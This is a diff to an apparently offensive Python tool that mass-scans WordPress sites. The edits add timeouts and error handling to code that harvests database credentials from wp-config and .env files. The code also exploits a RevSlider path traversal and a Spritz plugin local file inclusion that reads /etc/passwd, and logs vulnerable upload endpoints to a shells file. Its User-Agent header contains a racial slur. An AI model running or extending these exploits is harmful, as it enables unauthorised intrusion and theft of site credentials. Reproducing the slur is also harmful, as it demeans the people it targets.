@@ -18,7 +18,7 @@ now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
 Version = "v1.0"
-
+timeout = 2
 HEADERS = {
     'User-Agent': 'NiggerPenis-WIN!10',
     'Content-type' : '*/*',
@@ -120,37 +120,47 @@ DowloadConfig = [
 
 
 def config(url, path):
-    Exp = url + str(path)
-    GetConfig = requests.get(Exp, headers=HEADERS)
-    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
-    if GetConfig.status_code == 200:
-        if "DB_NAME" in GetConfig.text:
+    try:
+        Exp = url + str(path)
+        GetConfig = requests.get(Exp, headers=HEADERS)
+        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
+        if GetConfig.status_code == 200:
+            if "DB_NAME" in GetConfig.text:
 
-            with io.open(filename, "a+", encoding="utf-8") as f:
-                #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
-                f.write(f"\nDB RESULTS:\n{GetConfig.text}\n")
-            f.close()
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wp-configs ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
-        elif "DB_HOST" in GetConfig.text:
+                with io.open(filename, "a+", encoding="utf-8") as f:
+                    #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
+                    f.write(f"\nDB RESULTS:\n{GetConfig.text}\n")
+                f.close()
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wp-configs ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+            elif "DB_HOST" in GetConfig.text:
 
-            with io.open(filename, "a+", encoding="utf-8") as f:
-                #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
-                f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
-            f.close()
-            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Env config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+                with io.open(filename, "a+", encoding="utf-8") as f:
+                    #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
+                    f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
+                f.close()
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Env config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+    except:
+        #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
+        return
+
 
 
 
 def dirsscan(url, path):
-    Exp = url + str(path)
-    GetConfig = requests.get(Exp, headers=HEADERS)
-    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
-    if GetConfig.status_code == 200:
-        with io.open(filename, "a+", encoding="utf-8") as f:
-            #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
-            f.write(f"\n\n\nDIRSCAN: {GetConfig.url}\n\n\n")
-        f.close()
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
+    try:
+        Exp = url + str(path)
+        GetConfig = requests.get(Exp, headers=HEADERS, timeout=timeout)
+        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
+        if GetConfig.status_code == 200:
+            with io.open(filename, "a+", encoding="utf-8") as f:
+                #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
+                f.write(f"DIRSCAN: {GetConfig.url}\n")
+            f.close()
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url}")
+    except:
+        #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
+        return
+
         
     
 
@@ -244,6 +254,11 @@ def Spreedsheet(url):
 def revexploit(url):
         exploit = requests.get(url + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", '')+".txt"
+        if "invalid file" in exploit.text:
+            with open(filename, "a+") as f:
+                f.write(exploit.url)
+            f.close()
+
         if exploit.status_code == 200:
             with open(filename, "a+") as f:
                 f.write(exploit.text)
@@ -411,7 +426,7 @@ def wp_cherry(url):
             print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Cherry Upload {PURPLE}=>{RESET} {GREEN}Vuln")
             filename = "Results/shells.txt"
             with open(filename, "a+") as f:
-                f.write(content+content.url)
+                f.write(content.url)
             f.close()
             return dict(
                 url=url,
@@ -499,7 +514,7 @@ def wp_plugin(url):
 
 def wp_user(url):
     url + '/?author=1'
-    getuser = requests.get(url, headers=HEADERS).text
+    getuser = requests.get(url, headers=HEADERS, timeout=timeout).text
     matches = re.search(re.compile(r'author/(\w+)?/'), getuser)
     if matches:
         user = matches.group(1)
@@ -507,7 +522,7 @@ def wp_user(url):
     else:
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Users: {RED}No Users{RESET}")
 def wp_version(url):
-    getversion = requests.get(url, headers=HEADERS).text
+    getversion = requests.get(url, headers=HEADERS, timeout=timeout).text
     # searching version content from the http response. \d{:digit} version form 0.0.0
     matches = re.search(re.compile(
         r'content=\"WordPress (\d{0,9}.\d{0,9}.\d{0,9})?\"'), getversion)
@@ -520,7 +535,7 @@ def wp_version(url):
 
 def wp_dirs(url):
     
-   
+    
     dir1 = requests.get(url+"/wp-content/plugins/")
     url1 = dir1.url
     if "//" in dir1.url:
@@ -537,7 +552,8 @@ def wp_dirs(url):
     if dir2.status_code == 200:
         print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}{RESET}Found {GREEN}{url2}")
         
-    dir3 = requests.get(url+"/wp-register.php", headers=HEADERS)
+    dir3 = requests.get(url+"/wp-register.php", headers=HEADERS, timeout=timeout)
+    
    
 
     url3 = dir3.url
@@ -594,11 +610,12 @@ def spritz(url):
     test = requests.get(url+"wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd")
     if test.status_code == 200:
         filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
-        with open(filename, "a+") as f:
-            f.write(f"EXPLOIT: {test.url}\n\n")
-            f.write(test.text)
-        f.close()
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}spritz LFI {PURPLE}=>{GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
+        if "root" in test.text:
+            with open(filename, "a+") as f:
+                f.write(f"EXPLOIT: {test.url}\n\n")
+                f.write(test.text)
+            f.close()
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}spritz LFI {PURPLE}=>{GREEN} Vuln {RESET}saved results to {GREEN}" + filename)
     else:
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}spritz LFI {PURPLE}=>{RESET} {RED} Not Vuln")
 
@@ -741,7 +758,10 @@ def detect(url):
 
 
 def __getcontent__(url):
-        return requests.get(url, headers=HEADERS,verify=False).text
+        #print("HELLO")
+        return requests.get(url, headers=HEADERS,verify=False, timeout=timeout).text
+        #print("DONE")
+        #return var
 
 
 
@@ -770,8 +790,11 @@ def auto(url):
             wp_themes(url)
             wp_plugin(url)
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
+            
+
             dirs2(url)
             wp_dirs(url)
+            
             print("")
             Exploit(url)
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
@@ -799,8 +822,9 @@ def auto(url):
             Exploit(url)
             
     except Exception as e:
-        #print(e)
-        pass
+        print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
+        return
+        
     try:
         wp_thumbnailSlider(url)
     except:
@@ -948,7 +972,9 @@ def main():
                 urls = [x[:-1] for x in buf]
                 for url in urls:
                     auto(url)
-        except:
+                    print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Done!\n")
+        except Exception as e:
+            print(e)
             print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not open {RED}{file_name}!\n")
             return main()
         
